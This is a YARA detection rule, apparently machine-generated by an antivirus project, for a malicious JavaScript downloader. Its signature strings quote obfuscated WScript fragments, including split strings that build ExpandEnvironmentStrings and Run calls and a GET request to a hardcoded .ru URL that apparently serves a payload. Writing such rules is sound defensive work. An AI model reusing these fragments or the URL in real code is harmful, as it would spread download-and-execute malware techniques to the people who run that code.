rule sig_20160428_bf2657dd083245115f9ad5fa788bbd54 {
  meta:
    description = "datamaliciousorder - file 20160428_bf2657dd083245115f9ad5fa788bbd54.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dcb3f55e67fb82ea67a029168ce64fff74f2d2331672a126af5c3efb7337fe98"

  strings:
    $s1  = "function LdgAltVkhDpmEzjHgmWhi() {return ActYnbVbfNtaOzxTrsYqd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "var ActYnbVbfNtaOzxTrsYqd = function RjqFrqEwqEnjEeyFpoHug() {return ZadFviVinSjuHecIxgIsf[ZhyCijLssZkbIiiOqlBoh](\"WScript\"+\"" ascii
    $s3  = "return DszGzmUsrNkzMjeTolNrx - TzcHvzLrpMplTurVleTai;};" fullword ascii
    $s4  = "function NtmBspAbnAzuPqdFlwUdr(DszGzmUsrNkzMjeTolNrx, TzcHvzLrpMplTurVleTai){UbnClqTypAshFgjLbxOkk = UbnClqTypAshFgjLbxOkk * 1; " ascii
    $s5  = "BrcLbbAiwMmlZywSufYjz[KnaOcuFfzYonEctNbiXaj](\"G\" + \"ET\", \"http://sar-decor.ru/x8skfa\", false);" fullword ascii
    $s6  = "var ActYnbVbfNtaOzxTrsYqd = function RjqFrqEwqEnjEeyFpoHug() {return ZadFviVinSjuHecIxgIsf[ZhyCijLssZkbIiiOqlBoh](\"WScript\"+\"" ascii
    $s7  = "var ZadFviVinSjuHecIxgIsf = this[\"WScript\"];" fullword ascii
    $s8  = "function OhpTyeLbmXzpRhcApqEvk(EggCbsSajRmdNmuVthXvz){ActYnbVbfNtaOzxTrsYqd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s9  = "function OhpTyeLbmXzpRhcApqEvk(EggCbsSajRmdNmuVthXvz){ActYnbVbfNtaOzxTrsYqd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s10 = "function LdgAltVkhDpmEzjHgmWhi() {return ActYnbVbfNtaOzxTrsYqd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function YvqKuyOnhMnbRlaQidVyq(){return OvvWluQxlGseBosAefAel + \"\";};" fullword ascii
    $s12 = "function NtmBspAbnAzuPqdFlwUdr(DszGzmUsrNkzMjeTolNrx, TzcHvzLrpMplTurVleTai){UbnClqTypAshFgjLbxOkk = UbnClqTypAshFgjLbxOkk * 1; " ascii
    $s13 = "if (BrcLbbAiwMmlZywSufYjz[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function GdnFcfGkcFbeDwpYxsPhd() {return ((WrvAixXcmUvpGgdEqnSoh == true) && (WrvAixXcmUvpGgdEqnSoh == IcfWloZbxVugTfdKdcZpk)) ?" ascii
    $s15 = "function GdnFcfGkcFbeDwpYxsPhd() {return ((WrvAixXcmUvpGgdEqnSoh == true) && (WrvAixXcmUvpGgdEqnSoh == IcfWloZbxVugTfdKdcZpk)) ?" ascii
    $s16 = "WrvAixXcmUvpGgdEqnSoh = true; " fullword ascii
    $s17 = "function LfbAgpMkiCkpSepVfuQap(){return ZhyCijLssZkbIiiOqlBoh;};" fullword ascii
    $s18 = "var IcfWloZbxVugTfdKdcZpk = false;" fullword ascii
    $s19 = "var GvjJcqRozOueUucFmwAdw = false;" fullword ascii
    $s20 = "function MafHvyVtfBoaRbpXwrGdj()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}